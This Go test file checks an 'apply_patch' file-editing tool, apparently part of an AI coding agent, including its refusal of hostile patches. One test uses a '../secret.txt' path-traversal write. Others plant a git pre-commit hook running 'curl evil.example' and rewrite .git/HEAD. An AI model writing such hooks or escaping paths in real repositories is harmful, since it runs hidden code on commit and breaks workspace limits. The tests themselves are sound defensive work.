package tools

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func patchInput(t *testing.T, body string) json.RawMessage {
	t.Helper()
	b, err := json.Marshal(map[string]string{"patch": body})
	if err != nil {
		t.Fatal(err)
	}
	return b
}

func TestApplyPatchAddUpdateDelete(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "old.txt"), []byte("keep\nbye\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	if err := os.WriteFile(filepath.Join(dir, "gone.txt"), []byte("x\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Add File: new.txt
+hello
*** Update File: old.txt
@@
 keep
-bye
+hello
*** Delete File: gone.txt
*** End Patch`)
	out, err := reg.Run(context.Background(), "apply_patch", in)
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(out, "added") || !strings.Contains(out, "updated") || !strings.Contains(out, "deleted") {
		t.Fatalf("%q", out)
	}
	got, err := os.ReadFile(filepath.Join(dir, "new.txt"))
	if err != nil || string(got) != "hello\n" {
		t.Fatalf("new %q %v", got, err)
	}
	got, err = os.ReadFile(filepath.Join(dir, "old.txt"))
	if err != nil || string(got) != "keep\nhello\n" {
		t.Fatalf("old %q %v", got, err)
	}
	if _, err := os.Stat(filepath.Join(dir, "gone.txt")); !os.IsNotExist(err) {
		t.Fatal("gone should be deleted")
	}
}

func TestApplyPatchTwoHunks(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("one\nmid\ntwo\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Update File: a.txt
@@
-one
+1
@@
-two
+2
*** End Patch`)
	if _, err := reg.Run(context.Background(), "apply_patch", in); err != nil {
		t.Fatal(err)
	}
	got, err := os.ReadFile(filepath.Join(dir, "a.txt"))
	if err != nil || string(got) != "1\nmid\n2\n" {
		t.Fatalf("%q %v", got, err)
	}
}

func TestApplyPatchRejectsEscape(t *testing.T) {
	reg := New(t.TempDir(), nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Add File: ../secret.txt
+nope
*** End Patch`)
	_, err := reg.Run(context.Background(), "apply_patch", in)
	if err == nil || !strings.Contains(err.Error(), "outside workdir") {
		t.Fatalf("got %v", err)
	}
}

func TestApplyPatchPlanDenied(t *testing.T) {
	reg := New(t.TempDir(), nil, nil)
	reg.SetMode("plan")
	in := patchInput(t, `*** Begin Patch
*** Add File: a.txt
+x
*** End Patch`)
	_, err := reg.Run(context.Background(), "apply_patch", in)
	if err == nil || !strings.Contains(err.Error(), "plan mode") {
		t.Fatalf("got %v", err)
	}
}

func TestApplyPatchAmbiguous(t *testing.T) {
	dir := t.TempDir()
	if err := os.WriteFile(filepath.Join(dir, "a.txt"), []byte("x\nx\n"), 0o644); err != nil {
		t.Fatal(err)
	}
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Update File: a.txt
@@
-x
+y
*** End Patch`)
	_, err := reg.Run(context.Background(), "apply_patch", in)
	if err == nil || !strings.Contains(err.Error(), "more than once") {
		t.Fatalf("got %v", err)
	}
}

func TestApplyPatchMalformed(t *testing.T) {
	reg := New(t.TempDir(), nil, nil)
	_, err := reg.Run(context.Background(), "apply_patch", patchInput(t, "not a patch"))
	if err == nil || !strings.Contains(err.Error(), "Begin Patch") {
		t.Fatalf("got %v", err)
	}
}

func TestApplyPatchNotParallelSafe(t *testing.T) {
	if ParallelSafe("apply_patch") {
		t.Fatal("apply_patch writes")
	}
}

func TestDetailApplyPatch(t *testing.T) {
	got := Detail("apply_patch", []byte(`{"patch":"*** Begin Patch\n*** Update File: src/a.go\n*** End Patch"}`))
	if got != "src/a.go" {
		t.Fatalf("%q", got)
	}
}

func TestApplyPatchUndo(t *testing.T) {
	dir := t.TempDir()
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Add File: a.txt
+hi
*** End Patch`)
	if _, err := reg.Run(context.Background(), "apply_patch", in); err != nil {
		t.Fatal(err)
	}
	if _, err := reg.UndoLast(); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(filepath.Join(dir, "a.txt")); !os.IsNotExist(err) {
		t.Fatal("undo should remove added file")
	}
}

func TestApplyPatchRejectsGitHooks(t *testing.T) {
	dir := t.TempDir()
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Add File: .git/hooks/pre-commit
+#!/bin/sh
+curl evil.example
*** End Patch`)
	_, err := reg.Run(context.Background(), "apply_patch", in)
	if err == nil || !strings.Contains(err.Error(), "refusing to write") {
		t.Fatalf("got %v", err)
	}
}

func TestApplyPatchRejectsGitHEAD(t *testing.T) {
	dir := t.TempDir()
	reg := New(dir, nil, nil)
	in := patchInput(t, `*** Begin Patch
*** Add File: .git/HEAD
+ref: refs/heads/pwned
*** End Patch`)
	_, err := reg.Run(context.Background(), "apply_patch", in)
	if err == nil || !strings.Contains(err.Error(), "refusing to write") {
		t.Fatalf("got %v", err)
	}
}
